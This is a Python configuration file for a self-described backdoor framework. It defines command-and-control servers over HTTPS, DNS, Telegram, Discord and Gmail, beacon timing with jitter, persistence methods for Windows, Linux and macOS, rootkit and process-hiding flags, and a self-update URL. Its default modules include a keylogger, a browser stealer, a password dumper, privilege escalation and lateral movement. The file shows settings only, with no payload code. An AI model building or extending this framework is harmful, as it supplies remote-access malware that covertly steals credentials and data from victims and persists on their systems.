"""
Configuration management for the backdoor framework.
"""
import os
import hashlib
import platform
import getpass
from typing import List, Dict, Any
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()


class Config:
    """Central configuration class"""

    # ==========================================
    # AUTO-GENERATED VALUES
    # ==========================================

    # Master key generation (auto-generated from system info)
    MASTER_KEY = os.getenv('MASTER_KEY') or hashlib.sha256(
        platform.node().encode() +
        str(platform.uname()).encode() +
        getpass.getuser().encode()
    ).digest()

    # ==========================================
    # C2 SERVER CONFIGURATIONS
    # ==========================================

    C2_SERVERS = [
        {
            "protocol": "https",
            "host": os.getenv('C2_HTTPS_HOST', 'c2.example.com'),
            "port": int(os.getenv('C2_HTTPS_PORT', '443')),
            "path": os.getenv('C2_HTTPS_PATH', '/api/beacon')
        },
        {
            "protocol": "dns",
            "domain": os.getenv('C2_DNS_DOMAIN', 'c2.malicious.tk')
        },
        {
            "protocol": "telegram",
            "bot_token": os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN'),
            "chat_id": os.getenv('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID')
        },
        {
            "protocol": "discord",
            "webhook": os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/xxx')
        },
        {
            "protocol": "gmail",
            "email": os.getenv('GMAIL_EMAIL', 'backdoor.receiver@gmail.com'),
            "app_password": os.getenv('GMAIL_APP_PASSWORD', 'xxx')
        }
    ]

    # ==========================================
    # BEACON SETTINGS
    # ==========================================

    BEACON_INTERVAL = int(os.getenv('BEACON_INTERVAL', '30'))
    JITTER = float(os.getenv('BEACON_JITTER', '0.3'))

    # ==========================================
    # PERSISTENCE METHODS
    # ==========================================

    PERSISTENCE = {
        "windows": [
            "registry_run",
            "scheduled_task",
            "service",
            "startup_folder",
            "wmi"
        ],
        "linux": [
            "cron",
            "systemd",
            "rc_local",
            "profile",
            "ssh_authorized_keys"
        ],
        "macos": [
            "launch_agent",
            "cron",
            "login_item"
        ]
    }

    # ==========================================
    # STEALTH SETTINGS
    # ==========================================

    USE_ROOTKIT = os.getenv('USE_ROOTKIT', 'false').lower() == 'true'
    HIDE_PROCESS = os.getenv('HIDE_PROCESS', 'true').lower() == 'true'
    ENCRYPT_COMMS = os.getenv('ENCRYPT_COMMS', 'true').lower() == 'true'
    COMPRESS_DATA = os.getenv('COMPRESS_DATA', 'true').lower() == 'true'

    # ==========================================
    # MODULE CONFIGURATION
    # ==========================================

    # Parse enabled modules from environment
    enabled_modules_str = os.getenv('ENABLED_MODULES', 'shell,file_manager,keylogger,screenshot,browser_stealer,password_dumper,network_scanner,privilege_escalation,lateral_movement')
    MODULES = [module.strip() for module in enabled_modules_str.split(',') if module.strip()]

    # ==========================================
    # DEBUGGING & DEVELOPMENT
    # ==========================================

    DEBUG_MODE = os.getenv('DEBUG_MODE', 'false').lower() == 'true'
    LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')

    # ==========================================
    # ADVANCED SETTINGS
    # ==========================================

    ENABLE_PERSISTENCE = os.getenv('ENABLE_PERSISTENCE', 'true').lower() == 'true'
    ENABLE_STEALTH_CHECKS = os.getenv('ENABLE_STEALTH_CHECKS', 'true').lower() == 'true'
    UPDATE_URL = os.getenv('UPDATE_URL', 'https://your-update-server.com/backdoor_update.py')

    # ==========================================
    # UTILITY METHODS
    # ==========================================

    @classmethod
    def get_c2_server(cls, protocol: str) -> Dict[str, Any]:
        """Get C2 server configuration by protocol"""
        for server in cls.C2_SERVERS:
            if server['protocol'] == protocol:
                return server
        return None

    @classmethod
    def is_module_enabled(cls, module_name: str) -> bool:
        """Check if a module is enabled"""
        return module_name in cls.MODULES

    @classmethod
    def get_env_var(cls, key: str, default: str = None) -> str:
        """Get environment variable with optional default"""
        return os.getenv(key, default)

    @classmethod
    def reload_config(cls):
        """Reload configuration from environment (useful for runtime config changes)"""
        # Re-run the load_dotenv to pick up any changes
        load_dotenv(override=True)
        # Note: This won't update class variables that were already set
        # For runtime config changes, consider using instance variables instead